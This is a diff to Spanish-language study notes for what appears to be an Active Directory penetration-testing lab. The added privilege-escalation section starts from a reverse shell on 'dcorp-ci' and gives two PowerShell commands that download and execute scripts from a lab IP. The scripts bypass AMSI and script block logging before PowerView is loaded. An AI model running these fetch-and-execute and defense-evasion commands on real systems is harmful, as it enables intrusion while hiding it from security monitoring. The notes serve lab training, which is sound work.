@@ -374,4 +374,14 @@ Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | 
 
 
 # Escalada de privilegios
-En la maquina de dcorp-ci una vez hemos obtenido la reverse shell como en el laboratorio 05
+En la maquina de dcorp-ci una vez hemos obtenido la reverse shell como en el laboratorio 05, deberemos de cargar las siguientes herramientas en el orden indicado
+
+Primero deberemos de cargar dos ficheros que nos ayudaran al bypass de la AMSI
+```shell
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
+```
+```shell
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
+```
+
+Segundo ya una vez que hayamos ejecutado el bypas podremos cargar un PowerView
